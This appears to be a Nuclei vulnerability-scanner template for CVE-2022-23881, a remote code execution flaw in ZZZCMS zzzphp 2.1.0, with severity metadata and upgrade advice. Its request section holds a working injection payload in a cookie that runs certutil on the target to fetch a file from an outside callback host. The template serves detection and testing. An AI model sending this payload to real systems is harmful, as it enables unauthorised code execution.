id: CVE-2022-23881
info:
  name: ZZZCMS zzzphp 2.1.0 - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: ZZZCMS zzzphp 2.1.0 is at risk of remote code execution due to a vulnerability
    in the zzz_template.php file's danger_key() function.
  reference:
  - https://github.com/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/zzzphp%20V2.1.0%20RCE.md
  - http://www.zzzcms.com
  - https://nvd.nist.gov/vuln/detail/CVE-2022-23881
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-23881
    cwe-id: CWE-77
  tags: cve,cve2022,rce,zzzphp,zzzcms
  metadata:
    impact: The CVE-2022-23881 vulnerability in ZZZCMS zzzphp 2.1.0 allows remote
      attackers to execute arbitrary code, posing a significant impact on the security
      of the affected system.
    recommendation: It is highly recommended that users of ZZZCMS zzzphp v2.1.0 upgrade
      immediately to avoid the remote code execution vulnerability via danger_key()
      at zzz_template.php.
requests:
- raw:
  - 'GET /?location=search HTTP/1.1

    Host: {{Hostname}}

    Cookies: keys={if:=`certutil -urlcache -split -f https://{{interactsh-url}}/poc`}{end
    if}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 500
